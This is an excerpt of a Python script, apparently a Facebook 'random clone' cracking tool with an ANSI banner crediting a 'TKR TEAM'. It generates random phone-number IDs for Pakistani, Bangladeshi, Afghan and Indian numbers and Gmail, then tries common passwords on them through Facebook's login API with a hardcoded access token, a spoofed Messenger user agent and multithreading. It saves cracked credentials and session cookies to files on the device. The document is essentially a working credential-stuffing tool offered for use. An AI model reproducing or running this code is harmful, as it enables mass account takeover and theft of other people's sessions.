...
def S1():
	...
	e = ";[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/Moto G7 Play;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1512};FB_FW/1;]"
	ua = s + e	
	return ua
...
YP      YP   YP Y888888P `8888Y' YP   YP Y88888P 
 ...
 \033[1;32m Tool\033[1;37m 
 \033[1;95m
 \033[1;92m-------------------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •|✓\033[1;37m  Tahir Ali Khosa
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •|✓\033[1;37m  Tahir Ali Khosa
\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •|✓\033[1;37m  TKR TEAM.      
\033[1;32m•\033[1;37m TOOLS       \033[1;32m •|✓\033[1;37m  Trial
\033[1;32m•\033[1;37m VERSION     \033[1;32m •|✓\033[1;37m  1.0       
 \033[1;92m-------------------------------------------------------"""
def line():
	print(f'\033[1;32m-----------------------------------------------')
    ...
    try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                print(' \033[92;1m[1] pak random clone\n [2]\033[92;1m bd random clone\n \033[92;1m[3] afg random clone\n \033[92;1m[4] IND random clone\n [5]\033[95;1m Gmail clone\n [0] BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as TKR:     
                        clear()
...
def afg():
                user=[]
                clear()
                print('\x1b[1;92m EXAMPLE CODE 9370,3078,9377,9379...')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=50) as TKR:     
                        clear()
                        ...
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;92mCRACKIN  ON \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan12345','600700','afghanistan','۱۲۳۴۵۶','10002000','kabul123','afghan1234','kabul1234','khankhan','khan123']
                                TKR.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mTKR\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [TKR-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;32m [🥀] Cookies :- '+cookies)
				open('/sdcard/TKR-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [TKR-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/TKR-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m [\x1b[1;92mTKR\x1b[1;92m-\x1b[1;92m\x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			ua = 'Dalvik/2.1.0 (Linux; U; Android 9; Motorola Moto G7 Play Build/PPY29.105-76) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/Moto G7 Play;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1512};FB_FW/1;]'			
			...
			if 'session_key' in po:
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [TKR-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/TKR-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/Sultan12321232/Devil.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+93787276430?text='+tks),approval()
      time.sleep(1)
      menu()
  except:
    sys.exit()
